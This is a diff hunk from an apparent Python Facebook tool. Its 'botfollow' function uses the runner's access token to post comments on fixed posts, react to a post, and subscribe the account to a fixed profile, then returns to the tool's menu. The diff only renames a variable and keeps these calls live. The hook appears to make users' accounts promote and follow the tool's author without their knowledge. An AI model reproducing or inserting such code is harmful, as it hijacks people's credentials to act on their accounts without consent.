@@ -11,9 +11,9 @@ def botfollow():
     kom = komen
     post1 = '1230470587425293'
     post2 = '1230470587425293'
-    requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + komen + '&access_token=' + token)   
-    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + komen + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + komen + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom + '&access_token=' + token)   
+    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + kom + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=LOVE&access_token=' + token)
     requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token)#prof
     exit(proff.menu())
